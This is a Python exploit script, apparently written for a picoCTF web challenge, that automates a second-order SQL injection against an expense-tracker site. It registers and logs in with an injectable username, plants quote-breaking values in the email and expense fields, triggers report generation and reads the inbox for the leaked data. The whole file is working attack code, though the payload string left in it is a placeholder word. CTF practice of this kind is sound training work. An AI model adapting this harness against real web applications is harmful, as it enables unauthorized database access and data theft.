
import requests
import urllib3
from typing import Optional, Dict, Any
from dataclasses import dataclass, field

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


@dataclass
class ShadowConfig:
    host: str = "crystal-peak.picoctf.net:50802"
    base_url: str = field(init=False)
    session_cookie: str = "3359193552"
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36"
    timeout: int = 10
    
    def __post_init__(self):
        self.base_url = f"http://{self.host}"


class ShadowExploit:
    def __init__(self, config: ShadowConfig = ShadowConfig()):
        self.cfg = config
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": self.cfg.user_agent})
        self._session_token: Optional[str] = None
        
    def _headers(self, referer_path: str = "/", extra: Dict = None) -> Dict[str, str]:
        """Factory method untuk headers - DRY principle."""
        base = {
            "Host": self.cfg.host,
            "Origin": self.cfg.base_url,
            "Referer": f"{self.cfg.base_url}{referer_path}",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        if self._session_token:
            base["Cookie"] = f"td_cookie={self.cfg.session_cookie}; session={self._session_token}"
        else:
            base["Cookie"] = f"td_cookie={self.cfg.session_cookie}"
        if extra:
            base.update(extra)
        return base
    
    def _post(self, endpoint: str, data: Dict, referer: str = "/") -> requests.Response:
        return self.session.post(
            f"{self.cfg.base_url}{endpoint}",
            headers=self._headers(referer),
            data=data,
            timeout=self.cfg.timeout
        )
    
    def _get(self, endpoint: str, referer: str = "/") -> requests.Response:
        """Wrapper GET terpadu."""
        return self.session.get(
            f"{self.cfg.base_url}{endpoint}",
            headers=self._headers(referer),
            timeout=self.cfg.timeout
        )
    
    def signup(self, username: str, email: str = "admin'@gmail.com", password: str = "123") -> bool:
        resp = self._post("/signup", {
            "username": username,
            "email": email,
            "password": password,
            "action": ""
        }, referer="/signup")
        return resp.status_code == 200
    
    def login(self, username: str, password: str = "123") -> Optional[str]:
        resp = self._post("/login", {
            "username": username,
            "password": password,
            "action": ""
        }, referer="/login")
        
        if resp.status_code == 200:
            for cookie in self.session.cookies:
                if cookie.name == "session":
                    self._session_token = cookie.value
                    return cookie.value
        return None
    
    def add_expense(self, description: str = "admin'", amount: str = "1", date: str = "1111-11-11") -> bool:
        if not self._session_token:
            raise RuntimeError("Belum login. Panggil .login() dulu.")
        
        resp = self._post("/expenses", {
            "description": description,
            "amount": amount,
            "date": date
        }, referer="/expenses")
        return resp.status_code == 200
    
    def generate_report(self) -> bool:
        if not self._session_token:
            raise RuntimeError("Belum login.")
        
        resp = self._post("/generate_report", {}, referer="/expenses")
        return resp.status_code == 200
    
    def read_inbox(self) -> str:
        if not self._session_token:
            raise RuntimeError("Belum login.")
        
        resp = self._get("/inbox", referer="/expenses")
        return resp.text
    
    def execute_payload(self, union_payload: str) -> Optional[str]:
        print(f"[*] Executing payload: {union_payload[:50]}...")
        
        if not self.signup(union_payload):
            print("[!] Signup failed")
            return None
        
        session_token = self.login(union_payload)
        if not session_token:
            print("[!] Login failed")
            return None
        print(f"[+] Session: {session_token[:20]}...")
        
        self.add_expense()
        self.generate_report()
        
        result = self.read_inbox()
        print(f"[+] Inbox length: {len(result)} chars")
        return result


# ============= MISSION EXECUTION =============
if __name__ == "__main__":
    PAYLOAD = "jancuk"
    
    exploit = ShadowExploit()
    response = exploit.execute_payload(PAYLOAD)
    
    if response:
        print("\n" + "="*50)
        print(response)
        print("="*50)
    else:
        print("[!] Exploit gagal.")